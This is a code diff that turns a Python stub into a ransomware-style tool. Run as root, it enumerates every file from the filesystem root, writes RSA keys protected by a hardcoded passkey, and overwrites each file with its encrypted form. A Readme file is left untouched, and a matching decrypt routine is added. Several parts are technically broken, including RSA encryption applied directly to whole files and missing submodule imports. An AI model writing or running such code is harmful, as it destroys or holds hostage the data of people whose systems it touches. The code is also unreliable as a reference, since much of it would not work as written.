@@ -1,16 +1,87 @@
 import os
 import sys
 import cryptography
+import argparse
 self = sys.argv[0]
 passKey = "12345"
 dirIgnoreList = ['/bin', '/boot', '/dev', '/etc', '/lib', '/proc', '/run', '/sbin', '/sys', '/usr/lib', '/usr/lib64', '/usr/libexec']
-excludedFiles = [self, "/ReadMe.txt"]
+excludedFiles = [self, '/public_key.pem', '/private_key.pem', '/Readme.txt'] 
 origin = "/"
-def main():
+def encrypt():
+    print("Starting file enumeration from " + origin)
     fileList = findFiles(origin)
-    for file in fileList:
-        print(file)
-    
+    print("File enumeration complete, found " + str(len(fileList)) + " files")
+    print("Generating RSA keys")
+    private_key = cryptography.hazmat.primitives.asymmetric.rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+    )
+    public_key = private_key.public_key()
+    print("Key generation complete, writing files")
+    pubFile = open("/public_key.pem", "wb")
+    pubFile.write(public_key.public_bytes(
+        encoding=cryptography.hazmat.primitives.serialization.Encoding.PEM,
+        format=cryptography.hazmat.primitives.serialization.PublicFormat.SubjectPublicKeyInfo
+    ))
+    pubFile.close()
+    privFile = open("/private_key.pem", "wb")
+    privFile.write(private_key.private_bytes(
+        encoding=cryptography.hazmat.primitives.serialization.Encoding.PEM,
+        format=cryptography.hazmat.primitives.serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=cryptography.hazmat.primitives.serialization.BestAvailableEncryption(passKey.encode())
+    ))
+    privFile.close()
+    print("Key files written, encrypting files")
+    for f in fileList:
+        try:
+            with open(f, "rb") as file:
+                plaintext = file.read()
+            ciphertext = public_key.encrypt(
+                plaintext,
+                cryptography.hazmat.primitives.asymmetric.padding.OAEP(
+                    mgf=cryptography.hazmat.primitives.asymmetric.padding.MGF1(algorithm=cryptography.hazmat.primitives.hashes.SHA256()),
+                    algorithm=cryptography.hazmat.primitives.hashes.SHA256(),
+                    label=None
+                )
+            )
+            with open(f, "wb") as file:
+                file.write(ciphertext)
+            print("Encrypted " + f)
+        except Exception as e:
+            print("Failed to encrypt " + f + ": " + str(e))
+    print("Encryption complete.")
+def decrypt():
+    print("Reading private key file")
+    try:
+        with open("/private_key.pem", "rb") as key_file:
+            private_key = cryptography.hazmat.primitives.serialization.load_pem_private_key(
+                key_file.read(),
+                password=passKey.encode(),
+            )
+    except Exception as e:
+        print("Failed to read private key file: " + str(e))
+        return
+    print("Private key file read, starting decryption")
+    fileList = findFiles(origin)
+    print("File enumeration complete, found " + str(len(fileList)) + " files")
+    for f in fileList:
+        try:
+            with open(f, "rb") as file:
+                ciphertext = file.read()
+            plaintext = private_key.decrypt(
+                ciphertext,
+                cryptography.hazmat.primitives.asymmetric.padding.OAEP(
+                    mgf=cryptography.hazmat.primitives.asymmetric.padding.MGF1(algorithm=cryptography.hazmat.primitives.hashes.SHA256()),
+                    algorithm=cryptography.hazmat.primitives.hashes.SHA256(),
+                    label=None
+                )
+            )
+            with open(f, "wb") as file:
+                file.write(plaintext)
+            print("Decrypted " + f)
+        except Exception as e:
+            print("Failed to decrypt " + f + ": " + str(e))
+    print("Decryption complete.")
 def findFiles(origin):
     ignore_dirs = set(_norm_path(p) for p in dirIgnoreList)
     exclude_files = set(_norm_path(p) for p in excludedFiles)
@@ -49,4 +120,22 @@ def checkPass():
         return False
 if(os.getuid() == 0):
     if(checkPass()):
-        main()
+        parser = argparse.ArgumentParser(description="Basic CLI for encrypt/decrypt")
+        parser.add_argument('-e', '--encrypt', action='store_true', help='Encrypt files')
+        parser.add_argument('-d', '--decrypt', action='store_true', help='Decrypt files')
+        parser.add_argument('-o', '--origin', default=origin, help="Root path to start enumeration, defaults to '/'")
+        parser.add_argument('-p', '--passkey', help='Password used to encrypt/decrypt the private key') # MODIFY
+        args = parser.parse_args(sys.argv[1:])
+
+        origin = args.origin
+        passKey = args.passkey
+
+        if args.encrypt and args.decrypt:
+            print("Cannot specify both --encrypt and --decrypt")
+        else:
+            if not checkPass():
+                sys.exit(1)
+            if args.encrypt:
+                encrypt()
+            if args.decrypt:
+                decrypt()
